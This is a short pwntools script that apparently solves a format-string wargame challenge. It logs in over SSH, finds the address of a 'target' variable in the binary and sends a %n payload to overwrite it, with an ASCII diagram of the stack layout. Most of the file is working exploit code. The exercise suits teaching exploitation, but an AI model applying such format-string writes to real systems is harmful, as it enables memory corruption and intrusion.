from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

'''
      .
      .
  4   | bp_vuln
      +================ (printf)
  4   | vuln+X (call)
      +---------------- <-- sp_vuln ("$0")
  4   | buf ptr         o--.
      |----------------    |
  4   | size (512)         |
      |----------------    |
  4   | stream (stdin)     |
      |----------------    |
  4   |     ...            |
      +---------------- <--'
0x208 | buf
      +---------------- <-- bp_vuln
  4   | bp_main
      +================ (vuln)
  4   | main+X (call)
      +---------------- <-- sp_main
  ?   | align & ~0xf
      +---------------- <-- bp_main
  4   | bp_start
      +================ (main)
  ?   |     ...
      `---------------- 0xbfffffff (stack)

'''

target_value = 0x40
idx = 4  # buf ptr, size, stream, <pad>
payload = fit({0: p32(target_addr), target_value: '%' + str(idx) + '$n'})
with s.system(args.BIN) as p:
    p.sendline(payload)
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
